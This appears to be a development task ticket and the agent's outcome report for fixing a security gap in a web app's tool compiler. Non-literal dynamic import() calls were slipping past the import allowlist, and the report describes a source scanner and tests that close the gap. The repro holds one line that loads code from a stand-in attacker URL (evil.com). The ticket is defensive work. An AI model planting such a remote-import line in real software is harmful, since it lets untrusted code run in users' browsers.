---
id: 033
title: compileToolUi lets a non-literal dynamic import() straight through the import boundary
status: done
kind: fix
size: s
wave: 1
depends_on: []
touches: [apps/web/lib/tools/compile.ts, apps/web/tests/tools-compile.test.ts]
created_by: 032
session: a6a14b65-a7ad-4ec4-bc2e-dfc7f0e4efd4
model: sonnet
effort: high
---

## Task

apps/web/lib/tools/compile.ts documents its onResolve guard as a boundary, not a build step: "Nothing but EXTERNALS may be imported". It does not hold for `import(expr)` where the specifier is not a string literal.

Reproduced (probe against the real compileToolUi):
- `export default function App(){ import('lodash'); return null }` → ok=false, "Cannot import \"lodash\"" — correct.
- `const p = 'https://evil.com/x.js'; export default function App(){ import(p); return null }` → **ok=true, zero errors, zero warnings**. The specifier reaches the browser bundle untouched.

Why it slips: with a non-literal specifier esbuild cannot resolve anything, so onResolve never fires, and the post-build `metafile.inputs[].imports` sweep (which was added to catch tree-shaken imports) does not list it either. So both existing guards miss it and the author is told nothing.

The frame CSP (`script-src 'self'`, `connect-src 'none'`) is what actually stops the fetch at runtime, but that makes CSP the only line of defence for something the module claims to enforce, and the failure is silent rather than a diagnostic. It also matters for the same-origin fallback (TOOLS_ORIGIN unset), where 'self' is the app origin.

Fix: refuse dynamic import with a non-literal specifier at compile time with a CompileDiagnostic in the existing style (message naming IMPORT_RULE, pointed at a line where possible), rather than letting it through. Nothing legitimate in a Tool needs it — the import map only resolves the five EXTERNALS — so refusing every `import(` in ui.tsx whose argument is not one of EXTERNALS is acceptable and simplest. Two options for detection: esbuild emits a warning for unbundled dynamic imports (currently collected into `warnings` and ignored), which can be promoted to an error; or scan the metafile/AST. Do not regex the generated output for `import(` — the module's own comments explain why text matching is the wrong tool here.

While in the file, also add `react-dom` to the IMPORT_RULE message — it is in EXTERNALS but missing from every refusal string, so an author reading the error is told a shorter list than the one enforced.

Add tests to tests/tools-compile.test.ts covering: non-literal dynamic import refused; literal dynamic import still refused (already covered); a legitimate static `@visvine/tool-kit` import still compiles; and the refusal message naming all five allowed specifiers. Keep the "never throws, always a diagnostic" contract.

## Outcome

Fixed compileToolUi's import boundary to refuse dynamic import() with a non-literal specifier, which previously passed through to the browser bundle silently (ok:true, no diagnostics). Also fixed IMPORT_RULE and the test regex to name react-dom, which was missing from every refusal message despite being an allowed EXTERNAL.

Detection approach: esbuild's onResolve hook and the post-build metafile.inputs[].imports sweep both only see specifiers esbuild can read statically (bare string, or a template literal with no ${} splice) — a variable or expression argument never reaches either mechanism, confirmed empirically (esbuild 0.28.2 emits zero warnings for this case in any output format, so the "promote esbuild's warning" option didn't apply). TypeScript's compiler API was ruled out for the AST-scan option since typescript is a devDependency only, not available at runtime in production. Instead added a hand-written, token-aware scanner (findNonLiteralDynamicImports + helpers) that walks the raw ui.tsx source char-by-char, correctly skipping over strings/comments/template-literal splices (recursing into `${}` so a nested import() isn't missed), to find every `import(` call site and classify whether its argument is a single bare string/no-splice-template literal. Non-literal ones become a CompileDiagnostic in the existing style, pointed at the source line via a new locationAt() helper mirroring the existing locateModuleSyntax() pattern. Explicitly avoids regexing the generated bundle (per the module's own comment about exportsDefault) — the scan runs against the author's source with real token boundaries, verified to not false-positive on "import(" text sitting inside a string or comment.

Verified: reproduced the exact bug (ok:true) against the unmodified file first, then confirmed the fix flags it (ok:false, "Cannot import a non-literal value..."). During manual probing I found and fixed a real gap in my first pass — a dynamic import buried inside a template `${}` splice was silently skipped by skipTemplate's inner loop; refactored to a shared advanceToken() dispatch used by both the top-level scan and template-splice scanning, added a regression test for it. Added tests: non-literal dynamic import refused, literal dynamic import still refused (pre-existing case), template-splice-nested dynamic import refused, no false positive on "import(" inside a string/comment, legitimate static @visvine/tool-kit import still compiles, and refusal message names all five EXTERNALS. Ran `pnpm exec tsc --noEmit` (clean), `pnpm exec eslint lib/tools/compile.ts tests/tools-compile.test.ts --max-warnings=0` (clean), and the full tools-compile.test.ts suite (20/20 pass) plus all other tools-*.test.ts files (unaffected, all pass).
